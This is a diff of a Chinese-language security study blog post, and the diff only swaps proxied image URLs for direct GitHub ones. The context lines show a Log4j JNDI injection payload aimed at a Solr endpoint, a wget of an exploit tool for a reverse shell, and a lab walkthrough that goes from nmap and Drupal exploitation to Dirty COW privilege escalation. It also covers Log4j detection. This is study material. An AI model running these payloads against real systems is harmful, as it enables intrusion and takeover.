@@ -354,7 +354,7 @@ ___发表于_
 
 ### 文件上传的攻击流程
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230217134859.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230217134859.png)
 
 ### 文件上传的危害及防御
 
@@ -405,7 +405,7 @@ ___发表于_
 
 ### CSRF的攻击流程
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230217134900.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230217134900.png)
 
   1. 攻击者发现CSRF漏洞
 
@@ -558,9 +558,9 @@ ___发表于_
 >
 >
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230217134901.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230217134901.png)
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230217134902.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230217134902.png)
 
 ### C&C通信
 
@@ -777,7 +777,7 @@ Lookup的支持，但是却未对传入内容进行任何限制，导致攻击�
 >
 > 总结的来说：JNDI是一个接口，在这个接口下会有多种目录系统服务的实现，我们能通过名称等去找到相关的对象，并把它下载到客户端中来。
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230217134903.png)  
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230217134903.png)  
 还是前面所说的例子,我们在使用浏览器进行访问一个网络上的接口时,它和服务器之间的数据传输以及数据格式的组织,使用到基于TCP/IP之上的HTTP协议,只有通过HTTP协议,浏览器和服务端约定好的一个协议,他们之间才能正常的交流通讯,而JRMP也是一个与之相似的协议,只能JRMP这个协议仅用于Java
 RMI中
 
@@ -795,7 +795,7 @@ RMI中
 > Invocation`,而RMI的概念与之非常相似,只不过RMI调用的是一个Java方法,而浏览器调用的是一个http接口.并且Java中封装了RMI的一系列定义  
 >     >
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230217134904.png)  
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230217134904.png)  
 Server--->告诉注册中心Client--->根据名字和注册中心要端口
 
 > Registry翻译一下就是注册处,其实本质就是一个map(hashtable),注册着许多Name到对象的绑定关系,用于客户端查询要调用的方法的引用.
@@ -850,7 +850,7 @@ Provider之一，但同时也是协议。LDAP目录服务是中目录数据库�
   1. 漏洞触发点:`http://103.116.46.7:8983/solr/admin/cores?action=`
 
   2. 漏洞探测:`http://103.116.46.7:8983/solr/admin/cores?action=${jndi:ldap://${sys:java.version}.sxy8s9.dnslog.cn}`  
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230217134905.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230217134905.png)
 
   3. 下载工具进行反弹shell`wget https://security-1258894728.cos.ap-beijing.myqcloud.com/writeup/vulhub/log4j/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar`
 
@@ -861,26 +861,26 @@ Provider之一，但同时也是协议。LDAP目录服务是中目录数据库�
   6. 方式二将上方抓包改为POST传参
 
   7. 结果  
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230217134906.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230217134906.png)
 
 #### 检测手段
 
   1. 相关用户可根据Java jar解压后是否存在org/apache/logging/log4j相关路径结构，判断是否使用了存在漏洞的组件，若存在相关Java程序包，则很可能受漏洞影响。  
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230217134907.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230217134907.png)
 
   2. 若程序使用Maven打包，可查看项目的pom.xml文件中是否存在下图所示的相关字段，若版本号为小于2.15.1，则应用受漏洞影响。  
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230217134908.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230217134908.png)
 
   3. 若程序使用gradle打包，可查看build.gradle编译配置文件，若在dependencies部分存在org.apache.logging.log4j相关字段，且版本号为小于2.15.1，则应用受漏洞影响。  
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230217134909.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230217134909.png)
 
 攻击排查:
 
   1. 攻击者在利用漏洞前通常采用dnslog方式进行扫描、探测，常见的漏洞利用方式可通过应用系统报错日志中的`"javax.naming.CommunicationException"、"javax.naming.NamingException: problem generating object using object factory"、"Error looking up JNDI resource"`关键字进行排查。  
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230217134910.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230217134910.png)
 
   2. 攻击者发送的数据包中可能存在"${jndi:}" 字样，推荐使用全流量或WAF设备进行检索排查。  
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230217134911.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230217134911.png)
 
 #### 修复建议
 
@@ -1043,7 +1043,7 @@ Account Control)用户账号控制的认证
 
 系统漏洞提权即利用系统的自身缺陷，用来进行系统权限提升。对于这些系统漏洞，Windows和Liunx均存在提权用的可执行文件。
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230217134912.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230217134912.png)
 
   * https://github.com/chroblert/WindowsVulnScan
 
@@ -1059,7 +1059,7 @@ Account Control)用户账号控制的认证
 
   3. 使用exp进行提权
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230217134914.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230217134914.png)
 
 #### SUID提权
 
@@ -1115,15 +1115,15 @@ Write的过程中，可能产出竞态条件造成COW过程被破坏，导致出
 arp-scan 扫描主机
 
 `arp-scan -l`  
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230217134915.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230217134915.png)
 
 nmap 扫描目标主机开放端口
 
 `nmap -sS -T4 -p 1-65535 -v 192.168.64.141`  
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230217134916.png)  
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230217134916.png)  
 发现drupal,利用漏洞  
 通过开放的1898端口进入网站，看到目标网站，发现网站cms是drupal  
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230217134917.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230217134917.png)
 
     
     
@@ -1136,7 +1136,7 @@ nmap 扫描目标主机开放端口
     >run  
     
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230217134918.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230217134918.png)
 
 信息收集
 
@@ -1147,7 +1147,7 @@ nmap 扫描目标主机开放端口
     upload /tmp/linux-exploit-suggester.sh  /tmp/lasc.sh  
     
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230217134919.png)  
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230217134919.png)  
 进入shell 执行信息收集脚本,执行结果中发现【CVE-2016-5195】脏牛漏洞
 
     
@@ -1158,10 +1158,10 @@ nmap 扫描目标主机开放端口
     ./lasc.sh  
     
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230217134921.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230217134921.png)
 
 漏洞利用  
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230217134922.png)  
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230217134922.png)  
 下载exp,上传exp
 
     
@@ -1175,9 +1175,9 @@ nmap 扫描目标主机开放端口
     ./exp  
     
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230217134923.png)  
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230217134923.png)  
 打开交互式shell，切换root用户，提权成功  
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230217134924.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230217134924.png)
 
   * 
 
